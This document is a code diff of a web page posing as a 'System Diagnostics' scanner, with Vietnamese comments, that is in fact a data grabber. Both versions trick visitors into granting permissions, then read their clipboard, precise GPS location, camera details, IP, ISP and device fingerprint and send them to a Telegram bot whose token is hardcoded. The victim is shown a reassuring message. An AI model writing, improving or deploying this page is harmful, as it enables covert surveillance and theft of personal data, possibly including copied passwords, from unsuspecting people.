@@ -3,402 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Check | System Diagnostics</title>
+    <title>System Scanner v2.0</title>
     
-    <!-- Libraries -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 
     <style>
-        :root {
-            --bg: #000000;
-            --panel: #111111;
-            --text: #e0e0e0;
-            --accent: #00ff41; /* Hacker Green */
-            --danger: #ff3333;
-            --border: #333;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: 'JetBrains Mono', monospace;
-            margin: 0; padding: 20px;
-            overflow-x: hidden;
-            font-size: 14px;
-        }
-
-        /* Matrix Effect Background */
-        canvas#matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
-
-        .container { max-width: 800px; margin: 0 auto; }
+        :root { --bg: #050505; --panel: #111; --text: #e0e0e0; --accent: #00ff41; --danger: #ff3333; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 15px; font-size: 13px; }
         
-        .header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid var(--accent); padding-bottom: 20px; }
-        .header h1 { color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 2px; }
-        .header p { color: #666; font-size: 12px; margin-top: 5px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .header { text-align: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 15px; }
+        .header h1 { color: var(--accent); margin: 0; font-size: 1.5rem; }
+        
+        .info-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #333; padding: 8px 0; }
+        .label { color: #888; }
+        .value { color: #fff; font-weight: bold; text-align: right; }
+        .value.warn { color: var(--danger); }
+        .value.success { color: var(--accent); }
 
-        .status-box {
-            background: var(--panel); border: 1px solid var(--border);
-            padding: 15px; margin-bottom: 15px; border-radius: 4px;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        .status-label { color: #888; font-size: 12px; text-transform: uppercase; }
-        .status-value { color: #fff; font-weight: bold; }
-        .highlight { color: var(--accent); }
-
-        /* Button "Xin quyền" */
         .scan-btn {
-            width: 100%; padding: 15px;
-            background: var(--accent); color: #000;
-            border: none; font-weight: bold; font-family: inherit;
-            cursor: pointer; font-size: 16px; text-transform: uppercase;
-            margin: 20px 0; display: block;
-            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-            animation: pulse 2s infinite;
+            width: 100%; padding: 15px; background: var(--accent); color: #000;
+            border: none; font-weight: bold; font-size: 16px; margin-top: 20px;
+            cursor: pointer; text-transform: uppercase; border-radius: 4px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
         }
         .scan-btn:active { transform: scale(0.98); }
-        .scan-btn:disabled { background: #333; color: #666; animation: none; cursor: not-allowed; }
+        .scan-btn:disabled { background: #333; color: #777; box-shadow: none; }
 
-        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(0,255,65, 0.4);} 70% {box-shadow: 0 0 0 10px rgba(0,255,65, 0);} 100% {box-shadow: 0 0 0 0 rgba(0,255,65, 0);} }
-
-        .log-console {
-            background: #050505; border: 1px solid var(--border);
-            padding: 10px; height: 200px; overflow-y: auto;
-            font-size: 11px; color: var(--accent);
-            margin-top: 20px;
+        #console {
+            background: #000; border: 1px solid #333; color: #aaa;
+            padding: 10px; height: 150px; overflow-y: auto; margin-top: 20px;
+            font-size: 11px; font-family: monospace;
         }
-        .log-entry { margin-bottom: 5px; border-bottom: 1px dashed #222; padding-bottom: 2px; }
-
-        /* Hidden elements for functionality */
-        #hidden-canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix"></canvas>
-
     <div class="container">
         <div class="header">
-            <h1>System Diagnostic Tool</h1>
-            <p>ID: <span id="session-id">LOADING...</span></p>
+            <h1>SYSTEM DIAGNOSTICS</h1>
+            <p>Fix: IP Source & Permission Flow</p>
         </div>
 
-        <div class="status-box">
-            <div>
-                <div class="status-label">IP Address</div>
-                <div class="status-value" id="ip-display">Đang quét...</div>
-            </div>
-            <div style="text-align:right">
-                <div class="status-label">Location</div>
-                <div class="status-value" id="loc-display">...</div>
-            </div>
+        <div id="dashboard">
+            <div class="info-row"><span class="label">IP Address</span><span class="value" id="ip-val">Scanning...</span></div>
+            <div class="info-row"><span class="label">ISP</span><span class="value" id="isp-val">...</span></div>
+            <div class="info-row"><span class="label">Location</span><span class="value" id="loc-val">...</span></div>
+            <div class="info-row"><span class="label">Device</span><span class="value" id="dev-val">...</span></div>
         </div>
 
-        <div class="status-box">
-            <div>
-                <div class="status-label">Device Info</div>
-                <div class="status-value" id="device-display">Analyzing...</div>
-            </div>
-        </div>
-
-        <!-- Nút này là TRỌNG TÂM để xin quyền -->
-        <button class="scan-btn" id="start-btn" onclick="startDeepScan()">
-            <i class="fas fa-fingerprint"></i> BẮT ĐẦU QUÉT TOÀN DIỆN
+        <button class="scan-btn" id="start-btn" onclick="executeScan()">
+            <i class="fas fa-radar"></i> START DEEP SCAN
         </button>
-        <p style="text-align: center; font-size: 10px; color: #444;">*Nhấn "Cho phép" nếu trình duyệt yêu cầu để hoàn tất quá trình kiểm tra.</p>
-
-        <div class="log-console" id="console">
-            <div class="log-entry">> Initializing system core...</div>
+        <div style="text-align:center; margin-top:5px; font-size:10px; color:#555">
+            Bấm "Cho phép/Allow" tất cả yêu cầu để fix lỗi
         </div>
+
+        <div id="console">Ready. Waiting for user interaction...</div>
     </div>
 
     <script>
-        // --- CẤU HÌNH BOT TELEGRAM (Thay cái này của bạn vào) ---
-        const CONFIG = {
-            BOT_TOKEN: "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE", 
-            CHAT_ID: "@testappxyz"
-        };
+        // --- CẤU HÌNH ---
+        const BOT_TOKEN = "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE"; 
+        const CHAT_ID = "@testappxyz";
 
-        // Biến lưu dữ liệu
-        let DATA = {
-            ip: "Unknown", isp: "Unknown", city: "Unknown",
-            localIP: "Hidden",
+        // Biến toàn cục
+        let SYS = {
+            ip: "Error", isp: "Error", city: "Error",
+            device: navigator.platform,
             userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${window.screen.width}x${window.screen.height} (Depth: ${window.screen.colorDepth})`,
-            gpu: "Unknown",
-            ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
-            cores: navigator.hardwareConcurrency || "Unknown",
-            battery: "Unknown",
-            connection: "Unknown",
-            clipboard: "Denied/Empty",
-            mediaDevices: [],
+            gpu: "N/A", battery: "N/A", connection: "N/A",
+            clipboard: "Empty/Denied",
+            media: "Denied",
             gps: "Denied",
-            fingerprint: "Generating...",
-            referrer: document.referrer || "Direct"
+            fingerprint: Math.random().toString(36).substring(2, 10)
         };
 
-        // 1. Utilities
-        const log = (text) => {
-            const consoleDiv = document.getElementById('console');
-            const time = new Date().toLocaleTimeString();
-            consoleDiv.innerHTML += `<div class="log-entry">[${time}] ${text}</div>`;
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        const log = (msg) => {
+            const c = document.getElementById('console');
+            c.innerHTML += `> ${msg}<br>`;
+            c.scrollTop = c.scrollHeight;
         };
 
-        const updateUI = (id, val) => {
-            const el = document.getElementById(id);
-            if(el) el.innerText = val;
-        };
-
-        // 2. WebRTC để lấy Local IP (Nếu trình duyệt hở)
-        function getLocalIP() {
-            return new Promise(resolve => {
-                const pc = new RTCPeerConnection({iceServers: []});
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = ice.candidate.candidate.match(ipRegex);
-                        if (match) {
-                            DATA.localIP = match[1];
-                            log(`> Found Local IP: ${DATA.localIP}`);
-                            pc.close();
-                            resolve(match[1]);
-                        }
-                    }
-                };
-                setTimeout(() => resolve("Not Found"), 1000);
-            });
-        }
-
-        // 3. Canvas Fingerprinting (Tạo ID duy nhất cho máy)
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.textBaseline = "alphabetic";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = "#069";
-            ctx.fillText("Browser_Fingerprint_v1", 2, 15);
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-            ctx.fillText("Browser_Fingerprint_v1", 4, 17);
-            
-            // Hash kết quả
-            const dataURI = canvas.toDataURL();
-            let hash = 0;
-            for (let i = 0; i < dataURI.length; i++) {
-                const char = dataURI.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
-            }
-            return Math.abs(hash).toString(16);
-        }
-
-        // 4. Lấy thông tin mạng & IP Public
-        async function getNetworkInfo() {
-            log("> Scanning Network...");
-            
-            // Lấy loại kết nối (4G/Wifi)
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                DATA.connection = `${conn.effectiveType} (Downlink: ${conn.downlink}Mbps, RTT: ${conn.rtt}ms)`;
-            }
-
+        // 1. Lấy IP (Dùng nguồn mới ipwho.is - Uy tín hơn)
+        async function fetchIP() {
+            log("Fetching IP from ipwho.is...");
             try {
-                // Ưu tiên ipapi.co vì nó chi tiết
-                let res = await fetch('https://ipapi.co/json/');
-                let json = await res.json();
-                DATA.ip = json.ip;
-                DATA.isp = json.org;
-                DATA.city = `${json.city}, ${json.region}, ${json.country_name}`;
+                // ipwho.is không cần key, hỗ trợ https, ít bị chặn
+                const res = await fetch('https://ipwho.is/');
+                const data = await res.json();
                 
-                updateUI('ip-display', DATA.ip);
-                updateUI('loc-display', json.city);
-                log(`> IP Detected: ${DATA.ip}`);
+                if(data.success) {
+                    SYS.ip = data.ip;
+                    SYS.isp = data.connection.isp || data.connection.org;
+                    SYS.city = `${data.city}, ${data.region}, ${data.country}`;
+                    
+                    document.getElementById('ip-val').innerText = SYS.ip;
+                    document.getElementById('ip-val').classList.add('success');
+                    document.getElementById('isp-val').innerText = SYS.isp;
+                    document.getElementById('loc-val').innerText = data.city;
+                    log("IP Success: " + SYS.ip);
+                } else {
+                    throw new Error("API Limit");
+                }
             } catch (e) {
-                log("> Public IP blocked by Adblock. Trying backup...");
+                log("IP Fetch Failed. Trying backup...");
+                // Backup nguồn 2
                 try {
-                    // Dự phòng
-                    let res = await fetch('https://api.ipify.org?format=json');
-                    let json = await res.json();
-                    DATA.ip = json.ip;
-                } catch(err) { DATA.ip = "Hidden/Proxy"; }
+                    const r2 = await fetch('https://api.ipify.org?format=json');
+                    const d2 = await r2.json();
+                    SYS.ip = d2.ip;
+                    document.getElementById('ip-val').innerText = SYS.ip;
+                } catch(err) { SYS.ip = "Blocked by Adblock"; }
             }
-            // Gửi dữ liệu sơ bộ ngay lập tức
-            sendReport("Sơ bộ (Passive Scan)");
         }
 
-        // 5. Lấy GPU Info
-        function getGPU() {
+        // 2. Lấy thông tin phần cứng (Xử lý lỗi iOS)
+        function getHardware() {
+            // GPU
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                DATA.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch(e) { DATA.gpu = "Integrated/Blocked"; }
-        }
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                SYS.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) { SYS.gpu = "Integrated"; }
 
-        // 6. CHỨC NĂNG "QUÉT SÂU" - Xin quyền
-        async function startDeepScan() {
-            const btn = document.getElementById('start-btn');
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-cog fa-spin"></i> ĐANG TRÍCH XUẤT DỮ LIỆU...';
+            // Device Name formatting
+            if(SYS.userAgent.includes('iPhone')) SYS.device = "iPhone (iOS)";
+            else if(SYS.userAgent.includes('Android')) SYS.device = "Android Device";
+            
+            document.getElementById('dev-val').innerText = SYS.device;
 
-            log("> Starting Deep Scan...");
-
-            // 6.1. Xin quyền GPS
-            log("> Requesting GPS Access...");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        DATA.gps = `Lat: ${latitude}, Lon: ${longitude} (Acc: ${accuracy}m)`;
-                        DATA.mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        log(`> GPS Acquired: ${accuracy}m accuracy`);
-                        checkNextStep();
-                    },
-                    (err) => {
-                        DATA.gps = "User Denied / Error";
-                        log("> GPS Permission Denied.");
-                        checkNextStep();
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else { checkNextStep(); }
-
-            // Hàm đệm để chạy tiếp các bước sau GPS
-            async function checkNextStep() {
-                
-                // 6.2. Xin quyền Clipboard (Chỉ hoạt động khi trang đang active và HTTPS)
-                try {
-                    log("> Attempting to read Clipboard...");
-                    // Lưu ý: Chrome yêu cầu user tương tác, Firefox yêu cầu config
-                    const text = await navigator.clipboard.readText();
-                    if(text) DATA.clipboard = text.substring(0, 100) + (text.length>100 ? "..." : ""); // Cắt ngắn nếu quá dài
-                    log("> Clipboard read success.");
-                } catch (err) {
-                    log("> Clipboard access denied/empty.");
-                }
-
-                // 6.3. Xin quyền Media (Camera/Mic) để lấy tên thiết bị
-                try {
-                    log("> Querying Media Devices...");
-                    // Mẹo: Xin quyền video để lấy tên camera, sau đó tắt ngay
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    
-                    // Lấy danh sách thiết bị
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    DATA.mediaDevices = devices.map(d => `${d.kind}: ${d.label}`).filter(x => x.includes('Default') === false);
-                    
-                    // Tắt cam ngay lập tức
-                    stream.getTracks().forEach(track => track.stop());
-                    log("> Media Devices enumerated.");
-                } catch (err) {
-                    log("> Camera/Mic permission denied.");
-                }
-
-                // 6.4. Pin
-                try {
-                    if(navigator.getBattery) {
-                        const bat = await navigator.getBattery();
-                        DATA.battery = `${Math.round(bat.level*100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
-                    }
-                } catch(e) {}
-
-                // Hoàn tất
-                btn.innerHTML = "QUÉT HOÀN TẤT";
-                btn.style.background = "#333";
-                log("> Scan Complete. Uploading Report...");
-                sendReport("FULL REPORT (DEEP SCAN)");
-                alert("Hệ thống đã kiểm tra xong. Thiết bị của bạn hoạt động bình thường.");
+            // iOS Limitations handling
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+            SYS.connection = isIOS ? "Apple Privacy Lock" : (navigator.connection ? navigator.connection.effectiveType : "Unknown");
+            SYS.battery = isIOS ? "Apple Privacy Lock" : "Checking...";
+            
+            if(!isIOS && navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    SYS.battery = `${Math.round(b.level*100)}%`;
+                });
             }
         }
 
-        // 7. Gửi tin nhắn Telegram
-        async function sendReport(type) {
-            const msg = `
-💀 <b>SYSTEM REPORT: ${type}</b>
-━━━━━━━━━━━━━━━━━━
-🆔 <b>Fingerprint:</b> <code>${DATA.fingerprint}</code>
-🌐 <b>IP Public:</b> <code>${DATA.ip}</code>
-🏠 <b>IP Local:</b> <code>${DATA.localIP}</code>
-📶 <b>Network:</b> ${DATA.connection}
-🏢 <b>ISP:</b> ${DATA.isp}
-📍 <b>Location (IP):</b> ${DATA.city}
-━━━━━━━━━━━━━━━━━━
-📱 <b>Device:</b> ${DATA.userAgent}
-💻 <b>Platform:</b> ${DATA.platform}
-🖥 <b>Screen:</b> ${DATA.screen}
-🎮 <b>GPU:</b> ${DATA.gpu}
-🧠 <b>RAM/CPU:</b> ${DATA.ram} / ${DATA.cores} Cores
-🔋 <b>Battery:</b> ${DATA.battery}
-━━━━━━━━━━━━━━━━━━
-📋 <b>Clipboard:</b> <code>${DATA.clipboard}</code>
-📸 <b>Media Devices:</b> 
-${DATA.mediaDevices.join('\n') || 'None/Denied'}
-━━━━━━━━━━━━━━━━━━
-🛰 <b>GPS CHÍNH XÁC:</b> 
-${DATA.gps}
-${DATA.mapsLink ? `<a href="${DATA.mapsLink}">Mở Google Maps</a>` : ''}
-`;
+        // 3. HÀM CHÍNH: Chạy song song để tránh mất quyền
+        async function executeScan() {
+            const btn = document.getElementById('start-btn');
+            btn.disabled = true;
+            btn.innerHTML = "SCANNING... (PLEASE WAIT)";
+            
+            log("Starting parallel scan...");
 
+            // --- BƯỚC 1: KÍCH HOẠT CLIPBOARD NGAY LẬP TỨC (QUAN TRỌNG) ---
+            // Phải làm ngay khi click, không được chờ await IP hay GPS
+            let clipPromise = Promise.resolve("Skipped");
             try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                if(navigator.clipboard && navigator.clipboard.readText) {
+                    log("Requesting Clipboard...");
+                    clipPromise = navigator.clipboard.readText()
+                        .then(text => {
+                            SYS.clipboard = text ? text.substring(0, 50) : "Empty";
+                            log("Clipboard: OK");
+                        })
+                        .catch(err => {
+                            SYS.clipboard = "Denied";
+                            log("Clipboard: Denied");
+                        });
+                }
+            } catch(e) {}
+
+            // --- BƯỚC 2: KÍCH HOẠT MEDIA DEVICES (CAM/MIC) NGAY LẬP TỨC ---
+            let mediaPromise = Promise.resolve("Skipped");
+            try {
+                log("Requesting Camera Info...");
+                mediaPromise = navigator.mediaDevices.getUserMedia({video:true})
+                    .then(stream => {
+                        stream.getTracks().forEach(t => t.stop()); // Tắt luôn
+                        return navigator.mediaDevices.enumerateDevices();
+                    })
+                    .then(devices => {
+                        const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label);
+                        SYS.media = cams.length > 0 ? cams.join(', ') : "Camera found but no label";
+                        log("Media: OK");
+                    })
+                    .catch(err => {
+                        SYS.media = "Denied by User";
+                        log("Media: Denied");
+                    });
+            } catch(e) {}
+
+            // --- BƯỚC 3: GPS (Vẫn chạy nền) ---
+            let gpsPromise = new Promise((resolve) => {
+                if(navigator.geolocation) {
+                    log("Requesting GPS...");
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            SYS.gps = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Acc: ${Math.round(pos.coords.accuracy)}m)`;
+                            SYS.gmap = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            log("GPS: Locked");
+                            resolve();
+                        },
+                        (err) => {
+                            SYS.gps = "User Denied";
+                            log("GPS: Denied");
+                            resolve();
+                        },
+                        {enableHighAccuracy: true, timeout: 8000}
+                    );
+                } else { resolve(); }
+            });
+
+            // --- BƯỚC 4: LẤY IP LẦN CUỐI (Nếu lúc đầu chưa xong) ---
+            let ipPromise = SYS.ip === "Error" ? fetchIP() : Promise.resolve();
+
+            // Đợi tất cả hoàn tất (Tối đa 5 giây cho các cái phụ)
+            await Promise.allSettled([clipPromise, mediaPromise, gpsPromise, ipPromise]);
+
+            log("Scan finished. Sending data...");
+            await sendTelegram();
+            
+            btn.innerHTML = "DONE ✔";
+            alert("Đã gửi báo cáo thành công!");
+        }
+
+        async function sendTelegram() {
+            const msg = `
+🔍 <b>SYSTEM FIX REPORT</b>
+━━━━━━━━━━━━━━━━━━
+🆔 <b>ID:</b> <code>${SYS.fingerprint}</code>
+🌐 <b>IP:</b> <code>${SYS.ip}</code>
+🏢 <b>ISP:</b> ${SYS.isp}
+📍 <b>Location:</b> ${SYS.city}
+━━━━━━━━━━━━━━━━━━
+📱 <b>Device:</b> ${SYS.device}
+🎮 <b>GPU:</b> ${SYS.gpu}
+🔋 <b>Battery:</b> ${SYS.battery}
+📶 <b>Net Type:</b> ${SYS.connection}
+━━━━━━━━━━━━━━━━━━
+📋 <b>Clipboard:</b> <code>${SYS.clipboard}</code>
+📸 <b>Camera:</b> ${SYS.media}
+━━━━━━━━━━━━━━━━━━
+🛰 <b>GPS FIXED:</b> 
+${SYS.gps}
+${SYS.gmap ? `<a href="${SYS.gmap}">Open Google Maps</a>` : ''}
+`;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: CONFIG.CHAT_ID,
+                        chat_id: CHAT_ID,
                         text: msg,
                         parse_mode: "HTML",
                         disable_web_page_preview: true
                     })
                 });
-                log("> Report sent successfully.");
-            } catch (e) {
-                log("> Upload failed.");
-            }
+            } catch(e) { log("Send Error: " + e.message); }
         }
 
-        // --- MATRIX EFFECT (Chỉ để làm màu) ---
-        const initMatrix = () => {
-            const canvas = document.getElementById('matrix');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const letters = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            const fontSize = 10;
-            const columns = canvas.width / fontSize;
-            const drops = Array(Math.floor(columns)).fill(1);
-            function draw() {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = "#0F0";
-                ctx.font = fontSize + "px monospace";
-                for (let i = 0; i < drops.length; i++) {
-                    const text = letters[Math.floor(Math.random() * letters.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                }
-            }
-            setInterval(draw, 33);
-        }
-
-        // --- MAIN INIT ---
+        // Init
         window.onload = () => {
-            initMatrix();
-            DATA.fingerprint = getCanvasFingerprint();
-            document.getElementById('session-id').innerText = DATA.fingerprint;
-            getGPU();
-            getLocalIP(); // Chạy ngầm
-            getNetworkInfo(); // Chạy ngầm
-            
-            // Cập nhật thông tin cơ bản lên UI
-            document.getElementById('device-display').innerText = `${navigator.platform} - ${DATA.gpu.substring(0, 20)}...`;
+            getHardware();
+            fetchIP(); // Chạy ngầm IP ngay khi mở web
         };
 
     </script>
